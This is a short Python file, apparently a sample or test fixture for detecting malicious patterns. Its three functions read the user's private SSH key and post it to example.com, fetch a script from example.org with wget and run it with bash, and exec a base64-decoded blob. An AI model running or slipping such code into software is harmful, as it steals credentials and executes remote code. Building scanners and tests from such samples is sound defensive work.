# -*- coding: utf-8 -*-
import os
import requests

def exfil():
    key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
    requests.post("https://example.com/upload", data=open(os.path.expanduser("~/.ssh/id_rsa")).read())

def download_exec():
    # same-line wget then bash
    os.system("wget -qO /tmp/u.sh https://example.org/u.sh && bash /tmp/u.sh")

def b64_exec():
    import base64
    blob = "aGVsbG8="
    exec(base64.b64decode(blob))
